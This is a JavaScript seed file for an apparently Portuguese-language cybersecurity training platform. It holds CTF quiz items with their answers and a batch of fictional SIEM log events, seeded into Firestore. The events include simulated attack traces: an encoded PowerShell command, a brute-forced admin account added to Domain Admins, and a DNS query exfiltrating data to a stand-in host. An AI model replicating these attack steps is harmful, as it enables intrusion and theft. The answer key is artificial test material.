    explicacao: "32 caracteres hex = 128 bits = MD5 (SHA-1 tem 40, SHA-256 tem 64). MD5 é considerado quebrado para integridade contra adversário — colisões são práticas.",
  },
  {
    id: "ctf-log", ordem: 3, titulo: "Usuário suspeito", categoria: "Análise de logs", dificuldade: "intermediario",
    enunciado: "Trecho de log de autenticação (fictício). Qual usuário tem o comportamento mais suspeito? (responda só o nome de usuário)\n\n" +
      "08:01 login ok    ana.paula   10.10.1.5\n" +
      "08:03 login ok    r.moreira   10.10.1.9\n" +
      "02:47 login FAIL  admin       203.0.113.44\n" +
      "02:47 login FAIL  admin       203.0.113.44\n" +
      "02:48 login FAIL  admin       203.0.113.44\n" +
      "02:49 login ok    admin       203.0.113.44\n" +
      "09:15 login ok    ana.paula   10.10.1.5",
    dica: "Horário fora do expediente + falhas repetidas + IP externo + a conta mais valiosa.",
    respostas: ["admin"],
    explicacao: "A conta 'admin' teve 3 falhas às 02h47 de um IP externo (203.0.113.44, faixa de documentação) e logo em seguida um sucesso da mesma origem — padrão de força bruta bem-sucedida contra a conta mais privilegiada.",
  },
  {
    id: "ctf-porta", ordem: 4, titulo: "Serviço exposto", categoria: "Redes", dificuldade: "basico",
    enunciado: "Uma varredura mostra um host respondendo em TCP 3389 aberto para a internet. Que serviço é esse? (responda a sigla)",
    dica: "É o protocolo de área de trabalho remota da Microsoft.",
    respostas: ["rdp"],
    explicacao: "TCP 3389 = RDP (Remote Desktop Protocol). Expor RDP direto na internet é um dos vetores de ransomware mais comuns — deve ficar atrás de VPN/bastion e com MFA.",
  },
];

// ---------- PLAYGROUND SIEM — LOTE DE EVENTOS (Fase 3) ----------
// Conjunto fixo de eventos fictícios para o usuário praticar filtros/consultas.
const siemEvents = [
  { ts: "2026-03-04T08:12:03Z", host: "WKS-1001", user: "ana.paula", src: "10.10.1.5", action: "logon", result: "success", detail: "tipo 2 (interativo)" },
  { ts: "2026-03-04T08:40:10Z", host: "SRV-WEB01", user: "svc-web", src: "10.20.3.4", action: "process", result: "success", detail: "nginx reload" },
  { ts: "2026-03-04T02:47:01Z", host: "SRV-AD01", user: "admin", src: "203.0.113.44", action: "logon", result: "failure", detail: "senha incorreta" },
  { ts: "2026-03-04T02:47:05Z", host: "SRV-AD01", user: "admin", src: "203.0.113.44", action: "logon", result: "failure", detail: "senha incorreta" },
  { ts: "2026-03-04T02:47:09Z", host: "SRV-AD01", user: "admin", src: "203.0.113.44", action: "logon", result: "failure", detail: "senha incorreta" },
  { ts: "2026-03-04T02:49:22Z", host: "SRV-AD01", user: "admin", src: "203.0.113.44", action: "logon", result: "success", detail: "tipo 3 (rede)" },
  { ts: "2026-03-04T02:51:00Z", host: "SRV-AD01", user: "admin", src: "203.0.113.44", action: "group_change", result: "success", detail: "b.reboucas -> Domain Admins" },
  { ts: "2026-03-04T09:03:44Z", host: "WKS-3412", user: "m.silva", src: "10.30.5.12", action: "process", result: "success", detail: "powershell -EncodedCommand" },
  { ts: "2026-03-04T09:03:45Z", host: "WKS-3412", user: "m.silva", src: "10.30.5.12", action: "network", result: "allowed", detail: "-> 203.0.113.77:80" },
  { ts: "2026-03-04T09:30:12Z", host: "WKS-1001", user: "ana.paula", src: "10.10.1.5", action: "file", result: "success", detail: "abriu relatorio.xlsx" },
  { ts: "2026-03-04T16:20:03Z", host: "SRV-APP07", user: "svc-app", src: "10.20.3.7", action: "network", result: "denied", detail: "-> 203.0.113.200:8443 (egress deny)" },
  { ts: "2026-03-04T10:05:00Z", host: "WKS-2201", user: "p.costa", src: "10.30.4.7", action: "dns", result: "success", detail: "query TXT a8f3k2...9c.exfil-lab-example.test" },
];

export async function seedCyberIfNeeded() {
  const metaRef = doc(db, "content", "meta");
  const metaSnap = await getDoc(metaRef);
  if (metaSnap.exists() && metaSnap.data().cyberSeededV3) {
    console.log("[seed] Cybersecurity já populado, pulando.");
    return { seeded: false };
  }

  const batch = writeBatch(db);
  tracks.forEach((t) => batch.set(doc(db, "content", "cyberTracks", "items", t.id), t));
  lessons.forEach((l) => batch.set(doc(db, "content", "cyberLessons", "items", l.id), l));
  labs.forEach((lab) => batch.set(doc(db, "content", "cyberLabs", "items", lab.id), lab));
  socScenarios.forEach((s) => batch.set(doc(db, "content", "socScenarios", "items", s.id), s));
  ctfChallenges.forEach((c) => batch.set(doc(db, "content", "cyberCtf", "items", c.id), c));
  batch.set(doc(db, "content", "cyberSiem", "items", "lote-01"), { id: "lote-01", nome: "Lote 01 — dia 04/03", eventos: siemEvents });
  batch.set(
    metaRef,
    {
      cyberSeededV3: true,
      cyberCounts: { tracks: tracks.length, lessons: lessons.length, labs: labs.length, socScenarios: socScenarios.length, ctf: ctfChallenges.length },
      cyberSeededV3At: serverTimestamp(),
    },
    { merge: true }
  );

  await batch.commit();
  console.log(`[seed] ✅ Cybersecurity: ${tracks.length} trilhas, ${lessons.length} lições, ${labs.length} labs, ${socScenarios.length} SOC, ${ctfChallenges.length} CTF`);
  return { seeded: true };
}
